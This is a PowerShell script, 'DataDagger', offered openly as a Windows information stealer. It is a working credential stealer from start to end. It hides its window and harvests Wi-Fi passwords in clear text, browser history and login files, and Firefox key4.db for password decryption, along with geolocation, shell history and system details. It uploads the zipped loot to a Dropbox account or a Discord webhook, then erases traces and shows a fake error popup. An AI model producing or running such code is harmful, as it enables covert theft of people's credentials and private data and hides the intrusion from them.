############################################################################################################################################################ 
#                                                                                                                                                          #
#   Nome       : DataDagger                                                                                                                                #
#   Autor      : Clank                                                                                                                                     #
#   Categoria  : Recon                                                                                                                                     #
#   Alvo       : Windows 10,11                                                                                                                             #
#                                                                                                                                                          #
#                                     |  ######             ###    ##   ##             ####   ####       ###    ##   ##  ### ###  |                        #
#                                     |    ##              ## ##   ### ###            ##  ##   ##       ## ##   ###  ##   ## ##   |                        #
#                                     |    ##             ##   ##  #######           ##        ##      ##   ##  #### ##   ####    |                        #
#                                     |    ##             ##   ##  ## # ##           ##        ##      ##   ##  #######   ###     |                        #
#                                     |    ##             #######  ##   ##           ##        ##      #######  ## ####   ####    |                        #
#                                     |    ##             ##   ##  ##   ##            ##  ##   ##  ##  ##   ##  ##  ###   ## ##   |                        #
#                                     |  ######           ##   ##  ### ###             ####   #######  ##   ##  ##   ##  ### ###  |                        #
#                                                                                                                                                          #
#                                                              Anything can be hacked... or anyone                                                         #                                                 
#                                                                                                                                                          # 
#__________________________________________________________________________________________________________________________________________________________#
#                                                                                                                                                          #                                                                                 
#   Descrição:                                                                                                          |   ███████▀▀▀░░░░░░░▀▀▀███████   |#
#        Este script permite obter detalhes sobre o PC alvo.                                                            |   ████▀░░░░░░░░░░░░░░░░░▀████   |#
#        Detalhes como: palavra passe de redes wi-fi, especificações do computador, todos os processos em execução...   |   ███│░░░░░░░░░░░░░░░░░░░│███   |#
#        Todas as informações adquiridas serão formatadas de maneira organizada e enviadas para um arquivo.             |   ██▌│░░░░░░░░░░░░░░░░░░░│▐██   |#
#        Esse arquivo é enviado para um servidor discord.                                                               |   ██░└┐░░░░░░░░░░░░░░░░░┌┘░██   |#
#                                                                                                                       |   ██░░└┐░░░░░░░░░░░░░░░┌┘░░██   |#
#   Sobre mim:                                                                                                          |   ██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██   |#
#                                                                                                                       |   ██▌░│██████▌░░░▐██████│░▐██   |#
#                                                                                                                       |   ███░│▐███▀▀░░▄░░▀▀███▌│░███   |#
#                                                                                                                       |   ██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██   |#
#                                                                                                                       |   ██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██   |#
#                                                                                                                       |   ████▄─┘██▌░░░░░░░▐██└─▄████   |#
#                                                                                                                       |   █████░░▐█─┬┬┬┬┬┬┬─█▌░░█████   |#
#                                                                                                                       |   ████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████   |#
#                                                                                                                       |   █████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████   |#
#                                                                                                                       |   ███████▄░░░░░░░░░░░▄███████   |#
#                                                                                                                       |   ██████████▄▄▄▄▄▄▄██████████   |#
#                                                                                                                                                          #
#  Gitub: ClankPT                                                                                                                                          #
#  Discord: .clank_                                                                                                                                        #
#  Steam: Clank.PT                                                                                                                                         #
############################################################################################################################################################

$i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
add-type -name win -member $i -namespace native;
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);


# Faz uma Pasta chamada LOOT, um ficheiro em txt, e um ZIP 

$FolderName = "$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm)"

$FileName = "$FolderName.txt"

$ZIP = "$FolderName.zip"

New-Item -Path $env:tmp/$FolderName -ItemType Directory

############################################################################################################################################################

# Inserir os tokens pedidos abaixo "dropbox ou discord". 

#$db = ""

#$dc = ""

############################################################################################################################################################

# Reconhecimento de todos os diretórios do utilizador
tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt

# Histórico da PowerShell
Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt

############################################################################################################################################################

function Get-fullName {

    try {
    $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
    }
 
 # If no name is detected function will return $env:UserName 

    # Write Error is just for troubleshooting 
    catch {Write-Error "No name was detected" 
    return $env:UserName
    -ErrorAction SilentlyContinue
    }

    return $fullName 

}

$fullName = Get-fullName

#------------------------------------------------------------------------------------------------------------------------------------

function Get-email {
    
    try {

    $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
    return $email
    }

# If no email is detected function will return backup message for sapi speak

    # Write Error is just for troubleshooting
    catch {Write-Error "An email was not found" 
    return "No Email Detected"
    -ErrorAction SilentlyContinue
    }        
}

$email = Get-email


#------------------------------------------------------------------------------------------------------------------------------------

function Get-GeoLocation{
	try {
	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
	$GeoWatcher.Start() #Begin resolving current locaton

	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
		Start-Sleep -Milliseconds 100 #Wait for discovery.
	}  

	if ($GeoWatcher.Permission -eq 'Denied'){
		Write-Error 'Access Denied for Location Information'
	} else {
		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
	}
	}
    # Write Error is just for troubleshooting
    catch {Write-Error "No coordinates found" 
    return "No Coordinates found"
    -ErrorAction SilentlyContinue
    } 

}

$GeoLocation = Get-GeoLocation

$GeoLocation = $GeoLocation -split " "

$Lat = $GeoLocation[0].Substring(11) -replace ".$"

$Lon = $GeoLocation[1].Substring(10) -replace ".$"

############################################################################################################################################################

# local-user

$luser=Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID | Out-String 

############################################################################################################################################################
# Identificação do UAC "User Account Control"
Function Get-RegistryValue($key, $value) {  (Get-ItemProperty $key $value).$value }

$Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" 
$ConsentPromptBehaviorAdmin_Name = "ConsentPromptBehaviorAdmin" 
$PromptOnSecureDesktop_Name = "PromptOnSecureDesktop" 

$ConsentPromptBehaviorAdmin_Value = Get-RegistryValue $Key $ConsentPromptBehaviorAdmin_Name 
$PromptOnSecureDesktop_Value = Get-RegistryValue $Key $PromptOnSecureDesktop_Name

If($ConsentPromptBehaviorAdmin_Value -Eq 0 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "Never notIfy" }
 
ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "NotIfy me only when apps try to make changes to my computer(do not dim my desktop)" } 

ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "NotIfy me only when apps try to make changes to my computer(default)" }
 
ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 2 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "Always notIfy" }
 
Else{ $UAC = "Unknown" } 

############################################################################################################################################################
# Confirma se o LSASS "Local Security Authority Subsystem Service" está ativado
$lsass = Get-Process -Name "lsass"

if ($lsass.ProtectedProcess) {$lsass = "LSASS is running as a protected process."} 

else {$lsass = "LSASS is not running as a protected process."}

############################################################################################################################################################
# Identifica quais os programas que existem no arranque
$StartUp = (Get-ChildItem -Path ([Environment]::GetFolderPath("Startup"))).Name

############################################################################################################################################################

# Apanha as credenciais de rede wireless

try
{
$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
}
catch
{
$NearbyWifi="No nearby wifi networks detected"
}

############################################################################################################################################################

# Apanha informação sobre o PC

# Apanha o IP / Informação da Rede

try{$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content}
catch{$computerPubIP="Error getting Public IP"}

try{$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String}
catch{$localIP = "Error getting local IP"}

$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Name, MacAddress, Status | Out-String

# Verifica o RDP

if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
	$RDP = "RDP is Enabled" 
} else {
	$RDP = "RDP is NOT enabled" 
}

############################################################################################################################################################

#Apanha informações do sistema
$computerSystem = Get-CimInstance CIM_ComputerSystem

$computerName = $computerSystem.Name

$computerModel = $computerSystem.Model

$computerManufacturer = $computerSystem.Manufacturer

$computerBIOS = Get-CimInstance CIM_BIOSElement  | Out-String

$computerOs=(Get-WMIObject win32_operatingsystem) | Select Caption, Version  | Out-String

$computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List  | Out-String

$computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List  | Out-String

$computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}  | Out-String

$computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table  | Out-String

############################################################################################################################################################

$ScheduledTasks = Get-ScheduledTask

############################################################################################################################################################

$klist = klist sessions

############################################################################################################################################################

$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 50 FullName, LastWriteTime

############################################################################################################################################################

# Apanha informações dos discos
$driveType = @{
   2="Removable disk "
   3="Fixed local disk "
   4="Network disk "
   5="Compact disk "}
$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name="DriveType";Expression={$driveType.item([int]$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } | Out-String

#Get - Com & Serial Devices
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table | Out-String -width 250

############################################################################################################################################################

# Apanha a interface da rede
$NetworkAdapters = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress | Out-String -width 250

$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String

############################################################################################################################################################

# process first
$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine | Out-String -width 250

# Cria uma lista dos serviços
$listener = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
$listener = $listener | foreach-object {
    $listenerItem = $_
    $processItem = ($process | where { [int]$_.Handle -like [int]$listenerItem.OwningProcess })
    new-object PSObject -property @{
      "LocalAddress" = $listenerItem.LocalAddress
      "RemoteAddress" = $listenerItem.RemoteAddress
      "State" = $listenerItem.State
      "AppliedSetting" = $listenerItem.AppliedSetting
      "OwningProcess" = $listenerItem.OwningProcess
      "ProcessName" = $processItem.ProcessName
    }
} | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table | Out-String -width 250 

# Serviços
$service=Get-WmiObject win32_service | select State, Name, DisplayName, PathName, @{Name="Sort";Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName | Out-String -width 250

#  software Instalado (Apanha o uninstaller)
$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize | Out-String -width 250

# drivers
$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion | Out-String -width 250

# Placa Gráfica
$videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution | Out-String -width 250


############################################################################################################################################################

# Visão Final

$output = @"

############################################################################################################################################################ 
#                                                                                                                                                          #
#   Nome       : DataDagger                                                                                                                                #
#   Autor      : Clank                                                                                                                                     #
#   Categoria  : Recon                                                                                                                                     #
#   Alvo       : Windows 10,11                                                                                                                             #
#                                                                                                                                                          #
#                                     |  ######             ###    ##   ##             ####   ####       ###    ##   ##  ### ###  |                        #
#                                     |    ##              ## ##   ### ###            ##  ##   ##       ## ##   ###  ##   ## ##   |                        #
#                                     |    ##             ##   ##  #######           ##        ##      ##   ##  #### ##   ####    |                        #
#                                     |    ##             ##   ##  ## # ##           ##        ##      ##   ##  #######   ###     |                        #
#                                     |    ##             #######  ##   ##           ##        ##      #######  ## ####   ####    |                        #
#                                     |    ##             ##   ##  ##   ##            ##  ##   ##  ##  ##   ##  ##  ###   ## ##   |                        #
#                                     |  ######           ##   ##  ### ###             ####   #######  ##   ##  ##   ##  ### ###  |                        #
#                                                                                                                                                          #
#                                                              Anything can be hacked... or anyone                                                         #                                                 
#                                                                                                                                                          # 
#__________________________________________________________________________________________________________________________________________________________#


Full Name: $fullName

Email: $email

GeoLocation:
Latitude:  $Lat 
Longitude: $Lon

------------------------------------------------------------------------------------------------------------------------------

Local Users:
$luser

------------------------------------------------------------------------------------------------------------------------------

UAC State:
$UAC

LSASS State:
$lsass

RDP State:
$RDP

------------------------------------------------------------------------------------------------------------------------------

Public IP: 
$computerPubIP

Local IPs:
$localIP

MAC:
$MAC

------------------------------------------------------------------------------------------------------------------------------

Computer Name:
$computerName

Model:
$computerModel

Manufacturer:
$computerManufacturer

BIOS:
$computerBIOS

OS:
$computerOs

CPU:
$computerCpu

Mainboard:
$computerMainboard

Ram Capacity:
$computerRamCapacity

Total installed Ram:
$computerRam

Video Card: 
$videocard

------------------------------------------------------------------------------------------------------------------------------

Contents of Start Up Folder:
$StartUp

------------------------------------------------------------------------------------------------------------------------------

Scheduled Tasks:
$ScheduledTasks

------------------------------------------------------------------------------------------------------------------------------

Logon Sessions:
$klist

------------------------------------------------------------------------------------------------------------------------------

Recent Files:
$RecentFiles

------------------------------------------------------------------------------------------------------------------------------

Hard-Drives:
$Hdds

COM Devices:
$COMDevices

------------------------------------------------------------------------------------------------------------------------------

Network Adapters:
$NetworkAdapters

------------------------------------------------------------------------------------------------------------------------------

Nearby Wifi:
$NearbyWifi

Wifi Profiles: 
$wifiProfiles

------------------------------------------------------------------------------------------------------------------------------

Process:
$process

------------------------------------------------------------------------------------------------------------------------------

Listeners:
$listener

------------------------------------------------------------------------------------------------------------------------------

Services:
$service

------------------------------------------------------------------------------------------------------------------------------

Installed Software: 
$software

------------------------------------------------------------------------------------------------------------------------------

Drivers: 
$drivers

------------------------------------------------------------------------------------------------------------------------------

"@

$output > $env:TEMP\$FolderName/computerData.txt

############################################################################################################################################################
# Dados do Browser
function Get-BrowserData {

    [CmdletBinding()]
    param (	
        [Parameter (Position=1,Mandatory = $True)]
        [string]$Browser,    
        [Parameter (Position=1,Mandatory = $True)]
        [string]$DataType 
    ) 

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data\Default\History"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE\Appdata\Local\Microsoft\Edge\User Data\Default\Bookmarks"}
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'logins'    )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json"}
    elseif ($Browser -eq 'brave'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"}
    elseif ($Browser -eq 'brave'   -and $DataType -eq 'logins'    )  {$Path = "$Env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"}

    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} | Sort -Unique
    $Value | ForEach-Object {
        $Key = $_
        if ($Key -match $Search){
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = $Browser
                DataType = $DataType
                Data = $_
            }
        }
    } 
}

#Criar pasta "Dados-do-Browser"
New-Item -ItemType Directory -Path "$env:TEMP\$FolderName\Dados-do-Browser"

Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt

Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt

Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt

Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt

Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt

Get-BrowserData -Browser "firefox" -DataType "logins" >> $env:TMP\$FolderName\BrowserData.txt

Get-BrowserData -Browser "brave" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt

Get-BrowserData -Browser "brave" -DataType "logins" >> $env:TMP\$FolderName\BrowserData.txt

# Move o ficheiro para o local correto
Move-Item -Path "$env:TMP\$FolderName\BrowserData.txt" -Destination "$env:TEMP\$FolderName\Dados-do-Browser\BrowserData.txt"


# Termina o processo firefox, para sacar a key4.db "para desencriptar as passwords"
Get-Process -Name "firefox" | Stop-Process -Force

# Puxa as palavra passes encriptadas do firefox
Compress-Archive -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\key4.db", "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins.json", "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\logins-backup.json" -DestinationPath "$env:TEMP\$FolderName\Dados-do-Browser\Firefox-Passwords.zip"


############################################################################################################################################################

Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP

# Upload para a Dropbox

function dropbox {
$TargetFilePath="/$ZIP"
$SourceFilePath="$env:TEMP\$ZIP"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $db
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

if (-not ([string]::IsNullOrEmpty($db))){dropbox}

############################################################################################################################################################
#Upload para o Discord
function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}

 

############################################################################################################################################################

<#
.NOTES 
	Agora esta parte é para remover qualquer evidência que prove que o script correu
#>

# Delete nos ficheiros da pasta Temp

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete no histórico do run box 

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete no histórico da powershell

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Esvazia a Reciclagem

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

		
############################################################################################################################################################

# sinal que acabou um Pop-up

$done = New-Object -ComObject Wscript.Shell;$done.Popup("Syntax error",1)
